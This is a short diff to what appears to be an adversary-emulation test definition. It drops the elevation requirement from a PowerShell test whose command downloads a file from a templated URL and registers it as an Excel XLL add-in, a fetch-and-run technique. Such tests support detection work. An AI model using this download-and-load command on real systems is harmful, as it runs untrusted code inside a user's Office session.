@@ -19,7 +19,6 @@ atomic_tests:
       type: Path
       default: $env:tmp\HelloWorldXll.xll
   executor:
-    name: powershell
-    elevation_required: true 
+    name: powershell 
     command: |
       iwr -URI '#{xll_url}' -o "#{local_file}"; (new-object -ComObject excel.application).RegisterXLL("$env:tmp\HelloWorldXll.xll")
